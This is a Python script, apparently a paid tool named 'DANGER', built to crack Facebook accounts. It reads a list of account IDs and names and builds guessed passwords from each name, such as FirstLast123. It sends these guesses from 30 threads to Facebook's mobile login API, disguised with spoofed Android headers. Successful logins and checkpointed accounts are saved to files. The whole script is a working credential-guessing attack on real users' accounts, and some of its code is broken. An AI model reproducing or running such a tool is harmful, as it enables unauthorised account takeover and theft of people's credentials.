import os
import random
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as sop
import base64
import re
import sys
import time

# Install necessary packages
os.system("pip install pycurl")
os.system('pip uninstall requests chardet urllib3 idna certifi -y')
os.system('pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx beautifulsoup4')

try:
    import requests
    import json
    import re
    import random
    import uuid
    import subprocess
    from string import *
    from bs4 import BeautifulSoup as sop
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
    print('\nInstalling missing modules...')
    os.system('pip install requests bs4 futures==2 > /dev/null')

# Define global variables
model2 = ["M2101K6G", "Aquaris U Plus", "SM-G780G", "SM-O497J", "SM-Y608N", "SM-C736V"]
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id_list = []
ps = []
sid = []
total = []
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []

# Function to generate random user agent
def randBuildLSB():
    vchrome = f"{random.randint(100, 925)}.0.0.{random.randint(1, 8)}.{random.randint(40, 150)}"
    VAPP = random.randint(410000000, 499999999)
    END = '[FBAN/MobileAdsManagerAndroid;FBAV/257.0.0.37.60;FBBV/873387085;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/fr_FR;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(model2)} Build/SP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) {END}'
    return ua

def randBuildvsskj():
    END = '[FBAN/MobileAdsManagerAndroid;FBAV/408.0.0.56.44;FBBV/395941499;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/sr_RS;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/12;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(model2)} Build/SQ3A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) {END}'
    return ua

# Function to clear console and print the logo
def clear():
    os.system("clear")
    print(logo)

# Define the logo
logo = """\033[1;32m
d8888b.  .d8b.  d8b   db  d888b  d88888b d8888b. 
88  `8D d8' `8b 888o  88 88' Y8b 88'     88  `8D 
88   88 88ooo88 88V8o 88 88      88ooooo 88oobY' 
88   88 88~~~88 88 V8o88 88  ooo 88~~~~~ 88`8b   
88  .8D 88   88 88  V888 88. ~8~ 88.     88 `88. 
Y8888D' YP   YP VP   V8P  Y888P  Y88888P 88   YD 
\033[1;32mD \033[1;33mA \033[1;34mN \033[1;35mG \033[1;36mE \033[1;37mR~~~\033[1;37m[ALL TIME \033[1;37m FIREðŸ”¥ðŸ”¥]
\033[1;32m--------------------------------------------------------
\033[1;37m[\033[1;31m•\033[1;37m]\033[1;31mDEVELOPER    :   \033[1;31mMIRAJ-KHAN
\033[1;37m[\033[1;32m•\033[1;37m]\033[1;32mTOOLS        :   \033[1;32mFILE-CLONE
\033[1;37m[\033[1;33m•\033[1;37m]\033[1;33mVERSION      :   \033[1;33m 8.2.0
\033[1;37m[\033[1;34m•\033[1;37m]\033[1;34mWORKING      :   \033[1;34mDATA/WIFI
\033[1;37m[\033[1;35m•\033[1;37m]\033[1;35mSTATUS       :   \033[1;35mPAID
\033[1;32m------------------------------------------------------"""

# Function to print the results
def result(OKs, cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print("-----------------------------------------------------")
        print(' The Process has been Complete ')
        print(' TOTAL OK: %s' % str(len(oks)))
        print(' TOTAL CP: %s' % str(len(cps)))
        print("-----------------------------------------------------")
        input("Press enter to back to DANGER Menu ")
        exit()

# Main menu function
def DANGER():
    clear()
    print('[1] File Crack')
    print('[2] Join Whatsapp Group ')
    print('[3] Join Messenger Group ')
    print('')
    select = input('Select Menu > ')
    if select == '1':
        method_crack()
    elif select == '2':
        os.system('xdg-open https://chat.whatsapp.com/LTBJe0upO8SIUsMXvHVAQd')
    elif select == '3':
        os.system('xdg-open https://m.me/j/Abb5xIlL-jOql6rR/')
    else:
        print('\nSelect valid option ... ')
        time.sleep(2)
        DANGER()

# Function to select cracking method
def method_crack():
    global methods
    clear()
    print('[1] Method 1')
    print('[2] Method 2')
    print('[3] Method 3')
    print('[0] Back')
    print('')
    option = input('Select method > ')
    if option == '1':
        methods.append('methodA')
        main_crack().crack(id_list)
    elif option == '2':
        methods.append('methodD')
        main_crack().crack(id_list)
    elif option == '3':
        methods.append('methodC')
        main_crack().crack(id_list)
    elif option == '0':
        DANGER()
    else:
        print('\nSelect Valid Option ...')
        time.sleep(0.6)
        method_crack()

# Class for main cracking process
class main_crack:
    def __init__(self):
        self.id = []

    def crack(self, id_list):
        global methods
        clear()
        self.file = input('Put File Name > ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('Oops! File Not Found ...')
            time.sleep(2)
            clear()
            print('Try Again ...')
            time.sleep(2)
            self.crack(id_list)

    def methodA(self, sid, name, psw):
        try:
            global oks, cps, loop
            sys.stdout.write(f"\r\033[1;32m[DANGER] \033[1;33m{loop} \033[1;32m| \033[1;34mM1 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', name).replace('name', name.lower())
                with requests.Session() as session:
                    data = {
                        "adid": str(uuid.uuid4()),
                        "format": "json",
                        "device_id": str(uuid.uuid4()),
                        "cpl": "true",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "password",
                        "error_detail_type": "button_with_disabled",
                        "source": "register_api",
                        "email": sid,
                        "password": ps,
                        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "NO_FILE",
                        "currently_logged_in_userid": "0",
                        "locale": "en_GB",
                        "client_country_code": "GB",
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
                    }
                    headers = {
                        'User-Agent': randBuildLSB(),
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Host': 'graph.facebook.com',
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Connection-Type': 'MOBILE.LTE',
                        'X-Tigon-Is-Retry': 'False',
                        'x-fb-http-engine': 'Liger'
                    }
                    response = session.post('https://b-api.facebook.com/method/auth.login', data=data, headers=headers, allow_redirects=False)
                    if 'session_key' in response.text and 'EAAA' in response.text:
                        print(f'\r\r\033[1;32m[DANGER-OK] {sid} | {ps}\033[1;97m')
                        open('/sdcard/DANGER_OK.txt', 'a').write(sid + ' | ' + ps + '\n')
                        oks.append(sid)
                        break
                    elif 'www.facebook.com' in response.json()['error_msg']:
                        print(f'\r\r\x1b[38;5;196m[DANGER-CP] {sid} | {ps}\033[1;97m')
                        open('/sdcard/DANGER_CP.txt', 'a').write(sid + ' | ' + ps + '\n')
                        cps.append(sid)
                        break
            loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            print(f"Error: {str(e)}")

    def methodC(self, sid, name, psw):
        self.methodA(sid, name, psw)

    def methodD(self, sid, name, psw):
        self.methodA(sid, name, psw)

    def pasw(self):
        global srange
        clear()
        print('[1] FirstLast')
        print('[2] First123')
        print('[3] FirstLast123')
        print('[4] FirstLast1234')
        print('[5] Firstlast123')
        print('[6] FirstLast12345')
        print('[0] Back')
        print('')
        pwx = input('Select Password > ')
        if pwx == '1':
            srange = '1'
            self.passwords('first', 'last')
        elif pwx == '2':
            srange = '2'
            self.passwords('first', 'first123')
        elif pwx == '3':
            srange = '3'
            self.passwords('first', 'last123')
        elif pwx == '4':
            srange = '4'
            self.passwords('first', 'last1234')
        elif pwx == '5':
            srange = '5'
            self.passwords('first', 'firstlast123')
        elif pwx == '6':
            srange = '6'
            self.passwords('first', 'last12345')
        elif pwx == '0':
            method_crack()
        else:
            print('\nSelect Valid Option ...')
            time.sleep(0.6)
            self.pasw()

    def passwords(self, *args):
        global ps
        ps.clear()
        for arg in args:
            ps.append(arg)
        with tred(max_workers=30) as executor:
            executor.map(self.methodA, self.id)

if __name__ == "__main__":
    DANGER()
